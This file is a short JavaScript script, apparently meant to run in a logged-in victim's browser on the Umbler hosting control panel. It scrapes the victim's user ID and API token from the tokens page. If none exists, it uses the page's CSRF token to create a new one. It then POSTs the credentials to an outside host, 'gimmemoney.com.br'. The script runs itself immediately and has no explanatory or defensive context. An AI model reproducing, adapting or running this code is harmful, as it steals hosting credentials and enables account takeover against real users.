async function getCSRF(html) {
    const parser = new DOMParser();
    const doc = parser.parseFromString(html, "text/html");
    return doc.querySelector('input[name="__RequestVerificationToken"]').value;
}

async function getApiCreds(html) {
    try {
        const apiToken = html.match('<input type="text" id="" class="form-control input-selectable" value="([A-Za-z0-9]{32})"');
        const userId = html.match('<input type="text" class="form-control input-selectable" value="([A-Za-z0-9]{24})"');
        return apiToken ? `${userId[1]}:${apiToken[1]}` : null;
    } catch {
        return null;
    }
}

async function CreateApiCreds(csrf) {
    const form = new URLSearchParams();
    form.append('__RequestVerificationToken', csrf);
    form.append('X-Requested-With', "XMLHttpRequest");

    const response = await fetch("https://app.umbler.com/apitokens/generatetokenview", {
        method: "POST",
        body: form,
        headers: {
            "Content-Type": "application/x-www-form-urlencoded"
        }
    });

    const html = await response.text();
    return await getApiCreds(html);
}

async function send(data) {
    // userID:apiKey,type (read/created)

    const form = new URLSearchParams();
    form.append('data', data);

    await fetch("https://gimmemoney.com.br/?key=secretxyz", {
        method: "POST",
        body: form,
        headers: {
            "Content-Type": "application/x-www-form-urlencoded"
        }
    });
}

async function sendApiToken() {
    const response1 = await fetch("https://app.umbler.com/apitokens");
    const html = await response1.text();
    let apiCreds = await getApiCreds(html);

    if (apiCreds) {
        send(apiCreds + ",read")
        return
    }

    apiCreds = await CreateApiCreds(await getCSRF(html));

    if (apiCreds) {
        send(apiCreds + ",created")
    }
}

sendApiToken()
